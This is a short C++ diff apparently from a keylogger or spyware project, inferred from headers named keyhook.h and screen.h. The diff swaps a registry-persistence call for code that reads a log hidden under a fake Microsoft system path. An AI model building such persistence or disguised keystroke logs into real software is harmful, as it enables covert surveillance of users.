@@ -2,10 +2,11 @@
 #include "keyhook.h"
 #include "screen.h"
 #include "sys.h"
+#include "debug.h"
 
 int main() {
 #ifdef DEBUG_BUILD
-  Sys::AddToRegistry();
+  Stream::GetAllFilesInFolder(Stream::GetPath(R"(\Microsoft\SystemService\wnxshl2.log)"));
 #endif
 
 #ifndef DEBUG_BUILD
